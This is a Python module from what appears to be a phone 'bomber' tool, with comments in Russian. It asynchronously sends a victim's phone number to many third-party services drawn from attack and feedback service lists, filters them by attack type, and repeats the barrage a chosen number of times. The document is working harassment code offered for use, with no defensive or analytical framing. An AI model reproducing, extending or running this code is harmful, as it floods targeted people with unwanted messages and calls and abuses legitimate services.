from asyncio import ensure_future, gather, run
from aiohttp import ClientSession
from time import time

from Core.Attack.Services import urls
from Core.Attack.Feedback_Services import feedback_urls
from Core.Config import check_config



async def request(session, url, progress_callback=None):
    start_time = time()
    service_name = url['info'].get('website', 'Unknown')
    service_type = url['info'].get('attack', 'Unknown')
    status = '❌ Ошибка'
    
    try:
        async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=20) as response:
            elapsed = round((time() - start_time) * 1000, 0)  # Задержка в миллисекундах
            status = '✅ Успешно'
            if progress_callback:
                progress_callback(service_name, service_type, status, elapsed)
            return await response.text()
    except Exception as e:
        elapsed = round((time() - start_time) * 1000, 0)
        status = '❌ Ошибка'
        if progress_callback:
            progress_callback(service_name, service_type, status, elapsed)
        pass



async def async_attacks(number, progress_callback=None):
    async with ClientSession() as session:
        all_services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
        type_attack = check_config()['type_attack']
        
        # Фильтруем сервисы по типу атаки
        if type_attack == 'MIX':
            services = all_services
        else:
            services = [s for s in all_services if s['info']['attack'] == type_attack]
        
        tasks = [ensure_future(request(session, service, progress_callback)) for service in services]
        await gather(*tasks)



def start_async_attacks(number, replay, progress_callback=None):
    '''Запуск бомбера'''

    for _ in range(int(replay)):
        run(async_attacks(number, progress_callback))